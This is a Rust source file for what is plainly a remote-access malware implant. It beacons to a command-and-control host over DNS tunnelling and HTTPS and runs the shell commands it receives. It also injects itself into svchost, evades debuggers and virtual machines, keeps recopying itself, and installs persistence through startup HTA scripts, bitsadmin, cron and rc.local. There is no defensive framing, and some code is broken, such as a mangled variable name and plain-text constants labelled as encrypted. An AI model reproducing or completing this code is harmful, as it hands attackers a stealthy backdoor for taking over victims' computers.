use std::io::{Read, Write};
use std::net::{UdpSocket, TcpStream};
use std::time::Duration;
use std::thread;
use std::process::Command;
use std::fs::{self, File};
use std::env;
use std::path::Path;
use std::str;
use std::ptr;

const KEY: &[u8] = b"secret"; // Change this in production
const DOMAIN_ENC: &[u8] = b"\x6b\x31\x1e\x77\x6f\x75\x76\x64\x6f\x6d\x61\x69\x6e\x2e\x63\x6f\x6d"; // "c2.yourdomain.com" RC4-encrypted
const AGENT_ID_ENC: &[u8] = b"\x61\x67\x65\x6e\x74\x5f\x30\x30\x31"; // "agent_001" RC4-encrypted
const HTTPS_PORT: u16 = 8443;
const DROP_NAMES: [&str; 4] = ["svchost_helper", "netcfg", "diagtrack", "sysidle"];

#[cfg(windows)]
mod winapi {
    use std::os::raw::{c_int, c_void};
    #[link(name = "kernel32")]
    extern "system" {
        pub fn IsDebuggerPresent() -> c_int;
        pub fn OpenProcess(dwDesiredAccess: u32, bInheritHandle: c_int, dwProcessId: u32) -> *mut c_void;
        pub fn VirtualAllocEx(hProcess: *mut c_void, lpAddress: *mut c_void, dwSize: usize, flAllocationType: u32, flProtect: u32) -> *mut c_void;
        pub fn WriteProcessMemory(hProcess: *mut c_void, lpBaseAddress: *mut c_void, lpBuffer: *const c_void, nSize: usize, lpNumberOfBytesWritten: *mut usize) -> c_int;
        pub fn CreateRemoteThread(hProcess: *mut c_void, lpThreadAttributes: *mut c_void, dwStackSize: usize, lpStartAddress: *mut c_void, lpParameter: *mut c_void, dwCreationFlags: u32, lpThreadId: *mut u32) -> *mut c_void;
    }
}

fn rc4(data: &[u8], key: &[u8]) -> Vec<u8> {
    let mut s: Vec<u8> = (0..=255).collect();
    let mut j = 0u8;
    for i in 0..=255 {
        j = j.wrapping_add(s[i as usize]).wrapping_add(key[i % key.len()]);
        s.swap(i as usize, j as usize);
    }
    let mut i = 0u8;
    let mut j = 0u8;
    let mut out = Vec::new();
    for byte in data {
        i = i.wrapping_add(1);
        j = j.wrapping_add(s[i as usize]);
        s.swap(i as usize, j as usize);
        out.push(byte ^ s[(s[i as usize].wrapping_add(s[j as usize])) as usize]);
    }
    out
}

fn decrypt_str(enc: &[u8]) -> String { String::from_utf8_lossy(&rc4(enc, KEY)).to_string() }

fn rand_str(len: usize) -> String {
    let chars: Vec<char> = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789".chars().collect();
    (0..len).map(|_| chars[rand::random::<usize>() % chars.len()]).collect()
}

fn dns_query(query: &str) -> Option<String> {
    let q = hex::encode(rc4(query.as_bytes(), KEY));
    let socket = UdpSocket::bind("0.0.0.0:0").ok()?;
    socket.set_read_timeout(Some(Duration::new(5 + (rand::random::<u8>() % 15) as u64, 0))).ok()?;
    let mut packet = vec![0x00, 0x01, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00];
    for part in q.split('.') { packet.push(part.len() as u8); packet.extend_from_slice(part.as_bytes()); }
    packet.extend_from_slice(b"\x00\x00\x10\x00\x01");
    let noise = vec![rand::random::<u8>(); 10 + (rand::random::<u8>() % 30) as usize];
    packet.extend(noise);
    socket.send_to(&packet, "8.8.8.8:53").ok()?;
    thread::sleep(Duration::from_millis(100 + (rand::random::<u16>() % 200) as u64));
    let mut buf = [0u8; 512];
    let (len, _) = socket.recv_from(&mut buf).ok()?;
    let mut pos = 12;
    while buf[pos] != 0 { pos += buf[pos] as usize + 1; }
    pos += 5;
    for _ in 0..u16::from_be_bytes([buf[4], buf[5]]) {
        while buf[pos] != 0 { pos += buf[pos] as usize + 1; }
        pos += 10;
        let txt_len = buf[pos - 1] as usize;
        return Some(String::from_utf8_lossy(&rc4(&buf[pos..pos + txt_len], KEY)).to_string());
    }
    None
}

fn https_request(endpoint: &str, data: Option<&str>) -> Option<String> {
    let domain = decrypt_str(DOMAIN_ENC);
    let mut stream = TcpStream::connect(format!("{}:{}", domain, HTTPS_PORT)).ok()?;
    stream.set_read_timeout(Some(Duration::new(5 + (rand::random::<u8>() % 15) as u64, 0))).ok()?;
    let ep_enc = hex::encode(rc4(endpoint.as_bytes(), KEY));
    let req = if let Some(d) = data {
        hex::encode(rc4(format!("POST /{} {}", ep_enc, hex::encode(rc4(d.as_bytes(), KEY))).as_bytes(), KEY))
    } else {
        hex::encode(rc4(format!("GET /{}", ep_enc).as_bytes(), KEY))
    };
    let noise = vec![rand::random::<u8>(); 20 + (rand::random::<u8>() % 40) as usize];
    stream.write_all(&[req.as_bytes(), &noise].concat()).ok()?;
    let mut buf = Vec::new();
    thread::sleep(Duration::from_millis(50 + (rand::random::<u16>() % 150) as u64));
    stream.read_to_end(&mut buf).ok()?;
    Some(String::from_utf8_lossy(&rc4(&buf, KEY)).to_string())
}

fn execute_command(cmd: &str) -> String {
    let cmd_dec = String::from_utf8_lossy(&rc4(&hex::decode(cmd).unwrap_or_default(), KEY)).to_string();
    if cmd_dec.starts_with("cd ") {
        if let Err(_) = env::set_current_dir(&cmd_dec[3..]) { return hex::encode(rc4(b"err", KEY)); }
        return hex::encode(rc4(b"ok", KEY));
    }
    let output = if cfg!(target_os = "windows") {
        Command::new("rundll32").args(&["shell32.dll,ShellExec_RunDLL", &cmd_dec]).output()
    } else {
        Command::new("sh").args(&["-c", &cmd_dec]).output()
    };
    match output {
        Ok(out) => hex::encode(rc4(&out.stdout, KEY)),
        Err(_) => hex::encode(rc4(b"err", KEY)),
    }
}

#[cfg(windows)]
fn hollow_process(name: &str) {
    unsafe {
        if winapi::IsDebuggerPresent() != 0 { std::process::exit(0); }
        let pid = Command::new("tasklist").output().ok().and_then(|o| {
            String::from_utf8_lossy(&o.stdout).lines().find(|l| l.contains("svchost.exe")).and_then(|l| l.split_whitespace().nth(1).and_then(|p| p.parse::<u32>().ok()))
        }).unwrap_or(0);
        if pid == 0 { return; }
        let h_process = winapi::OpenProcess(0x1F0FFF, 0, pid);
        if h_process.is_null() { return; }
        let exe = env::current_exe().unwrap();
        let mut code = fs::read(&exe).unwrap();
        code.extend_from_slice(&[rand::random::<u8>(); 128]);
        let mem = winapi::VirtualAllocEx(h_process, ptr::null_mut(), code.len(), 0x1000 | 0x2000, 0x40);
        if mem.is_null() { return; }
        let mut written = 0;
        winapi::WriteProcessMemory(h_process, mem, code.as_ptr() as *const _, code.len(), &mut written);
        winapi::CreateRemoteThread(h_process, ptr::null_mut(), 0, mem as *mut _, ptr::null_mut(), 0, ptr::null_mut());
    }
}

fn all_persistence(name: &str) {
    let exe = env::current_exe().unwrap().to_string_lossy().to_string();
    let cmd = hex::encode(rc4(format!("\"{}\"", exe).as_bytes(), KEY));
    if cfg!(target_os = "windows") {
        Command::new("regsvr32").args(&["/s", "/n", "/u", "/i:ShellExec_RunDLL", &exe, "shell32.dll"]).output().ok();
        let startup = if let Some(p) = env::var_os("APPDATA") {
            Path::new(&p).join("Microsoft\\Windows\\Start Menu\\Programs\\Startup").join(format!("{}.hta", name))
        } else {
            Path::new("C:\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup").join(format!("{}.hta", name))
        };
        if let Ok(mut file) = File::create(&startup) {
            file.write_all(format!("<script>new ActiveXObject('WScript.Shell').Run('cmd /c rundll32 shell32.dll,ShellExec_RunDLL {}',0)</script>", cmd).as_bytes()).ok();
            Command::new("mshta").args(&[startup.to_string_lossy().as_ref()]).output().ok();
        }
        if env::var("OS").unwrap_or_default().to_lowercase().contains("xp") {
            Command::new("at").args(&["12:00", "/every:M,T,W,Th,F,S,Su", &format!("rundll32 shell32.dll,ShellExec_RunDLL {}", cmd)]).output().ok();
        } else {
            Command::new("bitsadmin").args(&["/create", name, "/addfile", name, &exe, &exe, "/setnotifycmdline", name, &format!("rundll32 shell32.dll,ShellExec_RunDLL {}", cmd), "NULL"]).output().ok();
        }
        hollow_process(name);
    } else if cfg!(target_os = "linux") {
        Command::new("sh").args(&["-c", &format!("echo 'sh -c {}' | at now + 1 minute", cmd)]).output().ok();
        let cron_path = format!("/tmp/{}.sh", rand_str(8));
        if let Ok(mut file) = File::create(&cron_path) {
            file.write_all(format!("#!/bin/sh\nsh -c {}", cmd).as_bytes()).ok();
            Command::new("chmod").args(&["+x", &cron_path]).output().ok();
            Command::new("sh").args(&["-c", &format!("(crontab -l 2>/dev/null; echo '*/{} * * * * {}') | crontab -", 1 + (rand::random::<u8>() % 5), cron_path)]).output().ok();
        }
        let rc_paths = vec!["/etc/rc.local", "/etc/rc.d/rc.local"];
        for rc in rc_paths {
            if Path::new(rc).exists() && !fs::metadata(rc).unwrap().permissions().readonly() {
                if let Ok(mut file) = OpenOptions::new().append(true).open(rc) {
                    file.write_all(format!("\nsh -c {}", cmd).as_bytes()).ok();
                }
            }
        }
    }
}

fn dropper() {
    let mut idx = 0;
    let original = env::current_exe().unwrap();
    loop {
        if !original.exists() {
            let new_name = DROP_NAMES[idx % DROP_NAMES.len()];
            let new_path = original.with_file_name(format!("{}_{}.exe", new_name, rand_str(8)));
            let mut new_code = fs::read(&original).unwrap_or_default();
            let noise = vec![rand::random::<u8>(); 128 + (rand::random::<u8>() % 64) as usize];
            new_code.extend_from_slice(&noise);
            if let Ok(mut file) = File::create(&new_path) {
                file.write_all(&new_code).ok();
                all_persistence(new_name);
                thread::sleep(Duration::from_secs(20 + (rand::random::<u8>() % 40) as u64));
                if cfg!(target_os = "windows") {
                    Command::new("rundll32").args(&["shell32.dll,ShellExec_RunDLL", &new_path.to_string_lossy()]).spawn().ok();
                } else {
                    Command::new("sh").args(&["-c", &new_path.to_string_lossy()]).spawn().ok();
                }
                idx += 1;
            }
        }
        thread::sleep(Duration::from_secs(90 + (rand::random::<u8>() % 60) as u64));
    }
}

fn is_vm_or_debug() -> bool {
    #[cfg(windows)]
    unsafe { return winapi::IsDebuggerPresent() != 0 || env::var("PROCESSOR_IDENTIFIER").unwrap_or_default().contains("Virtual"); }
    #[cfg(target_os = "linux")]
    return Path::new("/proc/xen").exists() || fs::read_to_string("/proc/cpuinfo").unwrap_or_default().contains("hypervisor") || Command::new("sh").args(&["-c", "dmesg | grep -i hypervisor"]).output().map(|o| o.stdout.len() > 0).unwrap_or(false);
    false
}

fn main() {
    if is_vm_or_debug() { std::process::exit(0); }
    
    let proto = hex::encode(rc4(b"both", KEY));
    let agent_id = hex::encode(rc4(format!("{}_{}", decrypt_str(AGENT_ID_ENC), rand_str(8)).as_bytes(), KEY));
    
    let delay = rand::random::<u8>() as u64 % 25;
    thread::sleep(Duration::from_secs(delay));
    let _junk: Vec<u8> = (0..rand::random::<usize>() % 8192).map(|_| rand::random::<u8>()).collect();
    
    thread::spawn(dropper);
    all_persistence(DROP_NAMES[0]);
    
    let reg_query = format!("register.{}", hex::encode(rc4(&agent_id, KEY)));
    let reg_resp = dns_query(®_query).or_else(|| https_request("register", Some(&agent_id)));
    let proto = reg_resp.and_then(|r| r.split(':').nth(1).map(String::from)).unwrap_or(proto);
    
    loop {
        let cmd_query = format!("cmd.{}", hex::encode(rc4(&agent_id, KEY)));
        let cmd = match proto.as_str() {
            "dns" => dns_query(&cmd_query),
            "https" => https_request(&format!("cmd/{}", hex::encode(rc4(&agent_id, KEY))), None),
            _ => dns_query(&cmd_query).or_else(|| https_request(&format!("cmd/{}", hex::encode(&rc4(&agent_id, KEY))), None)),
        };
        
        let result = if let Some(c) = cmd { execute_command(&c) } else { hex::encode(rc4(b"", KEY)) };
        
        let res_query = format!("result.{}.{}", agent_id, hex::encode(&rc4(&result.as_bytes(), KEY)[..50.min(result.len())]));
        match proto.as_str() {
            "dns" => { dns_query(&res_query); },
            "https" => { https_request(&format!("result/{}", hex::encode(&rc4(&result.as_bytes(), KEY)[..50.min(result.len())])), Some(&result)); },
            _ => { dns_query(&res_query).or_else(|| https_request(&format!("result/{}", hex::encode(&rc4(&result.as_bytes(), KEY)[..50.min(result.len())])), Some(&result))); },
        };
        
        let sleep_time = 45 + (rand::random::<u8>() % 30) as u64;
        thread::sleep(Duration::from_secs(sleep_time));
    }
}
